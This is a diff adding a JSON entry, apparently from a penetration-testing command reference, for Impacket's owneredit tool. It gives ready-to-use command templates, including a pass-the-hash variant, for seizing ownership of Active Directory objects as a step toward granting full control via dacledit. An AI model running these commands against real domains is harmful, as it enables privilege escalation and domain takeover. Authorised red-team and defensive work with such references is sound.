@@ -1,0 +1,18 @@
+{
+  "id": "impacket-owneredit",
+  "name": "Impacket owneredit",
+  "command": "impacket-owneredit '<domain>/<user>:<password>' -action write -target <target> -new-owner <attacker> -dc-ip <dc-ip>",
+  "description": "Read or rewrite the nTSecurityDescriptor owner of an AD object. Use after a WriteOwner edge to seize an object, then chain with dacledit to grant yourself GenericAll. Default action is read; pass -action write to commit.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap"],
+  "tags": ["impacket", "owneredit", "acl-abuse", "writeowner"],
+  "variations": [
+    { "label": "Read Current Owner", "requires": "password", "command": "impacket-owneredit '<domain>/<user>:<password>' -action read -target <target> -dc-ip <dc-ip>" },
+    { "label": "Hash Auth", "requires": "hash", "command": "impacket-owneredit '<domain>/<user>' -hashes :<nt-hash> -action write -target <target> -new-owner <attacker> -dc-ip <dc-ip>" },
+    { "label": "Use LDAPS", "requires": "password", "command": "impacket-owneredit '<domain>/<user>:<password>' -action write -target <target> -new-owner <attacker> -dc-ip <dc-ip> -use-ldaps" }
+  ],
+  "examples": [
+    "impacket-owneredit 'corp.local/jdoe:Password123!' -action write -target svc_app -new-owner jdoe -dc-ip 10.10.10.10"
+  ]
+}
